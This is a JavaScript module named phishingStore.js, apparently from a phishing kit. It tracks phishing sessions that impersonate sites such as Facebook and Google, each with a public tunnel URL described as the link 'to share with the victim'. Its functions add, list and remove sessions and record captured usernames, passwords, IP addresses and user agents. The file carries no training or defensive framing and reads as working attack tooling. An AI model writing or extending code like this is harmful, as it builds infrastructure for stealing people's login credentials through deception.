// lib/phishingStore.js
const sessions = new Map(); // Map<sessionId, sessionData>

// sessionData structure:
// {
//   sessionId: string,
//   templateId: string, // e.g., 'facebook', 'google'
//   publicUrl: string,  // The URL to share with the victim
//   tunnel: tunnelInstance, // From localtunnel() package
//   status: 'active' | 'inactive' | 'error',
//   startTime: Date,
//   capturedCredentials: Array<{ username, password, timestamp }>,
//   capturedIps: Array<{ ip, userAgent, timestamp }>,
// }

export const addSession = (sessionId, sessionData) => {
    console.log(`[Store] Adding session: ${sessionId}`);
    sessions.set(sessionId, sessionData);
};

export const getSession = (sessionId) => {
    console.log(`[Store] Getting session: ${sessionId}`);
    return sessions.get(sessionId);
};

export const removeSession = (sessionId) => {
    const session = sessions.get(sessionId);
    if (session) {
        console.log(`[Store] Removing session: ${sessionId}`);
        if (session.tunnel) {
            try {
                session.tunnel.close(); // Close the associated tunnel
                console.log(`[Store] Closed tunnel for session ${sessionId}`);
            } catch (error) {
                console.error(`[Store] Error closing tunnel for session ${sessionId}:`, error);
            }
        }
        sessions.delete(sessionId);
        return true; // Indicate removal
    }
    console.log(`[Store] Session not found for removal: ${sessionId}`);
    return false; // Indicate not found
};

export const getAllSessions = () => {
    // Return a summary, excluding sensitive/internal objects like 'tunnel'
    return Array.from(sessions.values()).map(s => ({
        sessionId: s.sessionId,
        publicUrl: s.publicUrl,
        templateId: s.templateId,
        status: s.status,
        startTime: s.startTime,
        credentialCount: s.capturedCredentials.length,
        ipCount: s.capturedIps.length,
    }));
};

export const addCapturedCredentials = (sessionId, username, password) => {
    const session = sessions.get(sessionId);
    if (session && session.status === 'active') {
        console.log(`[Store] Adding credentials for session: ${sessionId}`);
        session.capturedCredentials.push({ username, password, timestamp: new Date() });
    } else {
        console.log(`[Store] Cannot add credentials, session inactive/not found: ${sessionId}`);
    }
};

export const addCapturedIp = (sessionId, ip, userAgent) => {
     const session = sessions.get(sessionId);
    if (session && session.status === 'active') {
        console.log(`[Store] Adding IP/UA for session: ${sessionId}`);
        session.capturedIps.push({ ip, userAgent, timestamp: new Date() });
    } else {
         console.log(`[Store] Cannot add IP/UA, session inactive/not found: ${sessionId}`);
    }
};

export const updateSessionStatus = (sessionId, status) => {
    const session = sessions.get(sessionId);
    if (session) {
        console.log(`[Store] Updating status for session ${sessionId} to ${status}`);
        session.status = status;
    } else {
        console.log(`[Store] Cannot update status, session not found: ${sessionId}`);
    }
};